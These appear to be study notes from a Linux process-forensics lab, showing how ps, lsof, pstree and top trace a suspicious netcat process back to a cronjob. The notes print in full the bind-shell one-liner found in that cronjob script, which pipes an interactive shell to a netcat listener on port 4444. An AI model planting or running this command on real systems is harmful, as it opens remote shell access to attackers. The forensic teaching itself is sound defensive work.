# 01 — Processes

A process is a running program with a unique PID; processes form parent-child trees. Enumerate them to spot malicious activity and bad parent-child relationships. `ps` reads from the `/proc` virtual filesystem.

## ps
```bash
ps                     # processes in current session (PID, TTY, TIME, CMD)
ps -u janice           # processes for a specific user
ps -eFH                # ALL processes, extra-full format, hierarchical (forest)
ps -f <pid> <pid> ...  # full-format listing for specific PIDs
```
`-eFH` is the workhorse for forensics: `-e` all, `-F` extra full, `-H` forest. Pipe to `less`/`grep`. In the room, three suspicious processes shared parent PID 775:
- `nc -l 0.0.0.0 4444` — Netcat listening on all interfaces = **bind shell** (binds a port, waits for a connection, spawns a shell).
- `cat /tmp/f` and `/bin/sh -i` — the bind-shell one-liner's plumbing. `/tmp/f` is a **named pipe** for bidirectional data.

Confirm a named pipe by the `p` type bit:
```bash
ls -l /tmp/f
# prw-rw-r-- ...   <- leading 'p' = named pipe (FIFO)
```

## lsof — open files for a process
```bash
sudo lsof -p <pid>
```
For the `nc` PID it showed FIFO handles on `/tmp/f` (read/write) and `TCP *:4444 (LISTEN)` — confirming the bind-shell setup.

## pstree — visualize the tree
```bash
pstree -p -s <pid>     # -p show PIDs, -s show parent chain
```
Traced the `nc` back through `abzkd83o4jakxld` → `sh` → `cron` — i.e. the bind shell was launched by a **cronjob** running a script in `/home/janice`. The script (`abzkd83o4jakxld.sh`) was the classic one-liner:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```
(with a lockfile so only one instance runs — set up for persistence).

## top — real-time
```bash
top -d 5 -c -u janice   # -d refresh secs, -c full command paths, -u filter user; q to quit
```

## Suspicious parent-child relationships
Baseline normal first, then flag deviations. Classic example: a web server (`apache`/`www-data`) spawning `bash` → likely command injection / RCE. SIEM/EDR can baseline normal process relationships and alert on strays.
